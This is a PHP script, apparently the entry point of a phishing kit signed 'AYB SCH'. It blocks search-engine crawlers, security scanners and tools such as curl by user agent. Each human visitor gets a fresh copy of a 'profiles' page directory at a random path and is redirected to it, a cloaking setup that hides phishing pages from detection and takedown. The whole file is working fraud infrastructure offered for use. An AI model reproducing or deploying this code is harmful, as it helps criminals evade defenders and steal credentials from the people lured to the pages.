<?php
function is_bitch($FMDuser_agent){
    $bitchs = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'Sogou web spider',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
    	foreach($bitchs as $bitch){
            if( stripos( $FMDuser_agent, $bitch ) !== false ) return true;
        }
    	return false;
}
function Mcopy_it($fi,$to) {
	$dir = opendir($fi);
	@mkdir($to);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($fi . '/' . $file) ) {
				Mcopy_it($fi . '/' . $file,$to . '/' . $file);
			} else {
				copy($fi . '/' . $file,$to . '/' . $file);
			}
		}
	}
	closedir($dir);
}
function MgenRan($Mlength = 50) {
    $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $String = '';
    for ($i = 0; $i < $Mlength; $i++) {
        $String .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $String;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    echo "YOU CAN NOT DO ANYTHING FUCKING BOT :D BECAUSE AYB SCH WAS HERE !";
    exit;
}
$rand = MgenRan('50');
$to = "ACCESS744558886441BNG5F7558DERS85699SVB/F".md5(base64_encode(rand(0,10000).gmdate("His")));
Mcopy_it("profiles",$to);
header("Location: ".$to."?dispatch=$rand");
?>